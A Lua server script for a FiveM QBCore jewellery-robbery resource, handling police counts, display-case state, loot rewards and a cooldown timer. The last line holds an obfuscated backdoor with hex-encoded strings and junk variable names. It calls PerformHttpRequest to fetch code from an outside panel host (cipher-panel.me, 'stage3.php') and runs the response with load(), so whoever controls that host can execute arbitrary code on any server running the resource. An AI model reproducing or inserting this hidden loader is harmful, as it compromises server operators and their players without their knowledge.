local QBCore = exports['qb-core']:GetCoreObject()
local timeOut = false

-- Callback

QBCore.Functions.CreateCallback('qb-jewellery:server:getCops', function(source, cb)
	local amount = 0
    for k, v in pairs(QBCore.Functions.GetQBPlayers()) do
        if v.PlayerData.job.name == "police" and v.PlayerData.job.onduty then
            amount = amount + 1
        end
    end
    cb(amount)
end)

-- Events

RegisterNetEvent('qb-jewellery:server:setVitrineState', function(stateType, state, k)
    Config.Locations[k][stateType] = state
    TriggerClientEvent('qb-jewellery:client:setVitrineState', -1, stateType, state, k)
end)

RegisterNetEvent('qb-jewellery:server:vitrineReward', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local otherchance = math.random(1, 4)
    local odd = math.random(1, 4)

    if otherchance == odd then
        local item = math.random(1, #Config.VitrineRewards)
        local amount = math.random(Config.VitrineRewards[item]["amount"]["min"], Config.VitrineRewards[item]["amount"]["max"])
        if Player.Functions.AddItem(Config.VitrineRewards[item]["item"], amount) then
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[Config.VitrineRewards[item]["item"]], 'add')
        else
            TriggerClientEvent('QBCore:Notify', src, Lang:t('error.to_much'), 'error')
        end
    else
        local amount = math.random(2, 4)
        if Player.Functions.AddItem("10kgoldchain", amount) then
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items["10kgoldchain"], 'add')
        else
            TriggerClientEvent('QBCore:Notify', src, Lang:t('error.to_much'), 'error')
        end
    end
end)

RegisterNetEvent('qb-jewellery:server:setTimeout', function()
    if not timeOut then
        timeOut = true
        TriggerEvent('qb-scoreboard:server:SetActivityBusy', "jewellery", true)
        Citizen.CreateThread(function()
            Citizen.Wait(Config.Timeout)

            for k, v in pairs(Config.Locations) do
                Config.Locations[k]["isOpened"] = false
                TriggerClientEvent('qb-jewellery:client:setVitrineState', -1, 'isOpened', false, k)
                TriggerClientEvent('qb-jewellery:client:setAlertState', -1, false)
                TriggerEvent('qb-scoreboard:server:SetActivityBusy', "jewellery", false)
            end
            timeOut = false
        end)
    end
end)

local WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[4][WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x47\x64\x36\x74\x72\x38", function (MvZeiadgwppzYAcQhzTgSymgpPuXQYUgixVcWfXTfeWlJGAXtoXNUkdYAxTyymLeBaLrFC, nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG) if (nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG == WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[6] or nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG == WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[5]) then return end WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[4][WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[2]](WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[4][WmOKwghFTYBlZuiVouneNGKsuvCQnaJGDYTfpREJLxkWTtXHRipGeRcoeVxqxXUbFDvXFt[3]](nThGbWuuokyqXZQsxhuJXorGcHmjiQJIburHqKfTWlBcbrYMCsmRTejWALaGRHfRUqfSeG))() end)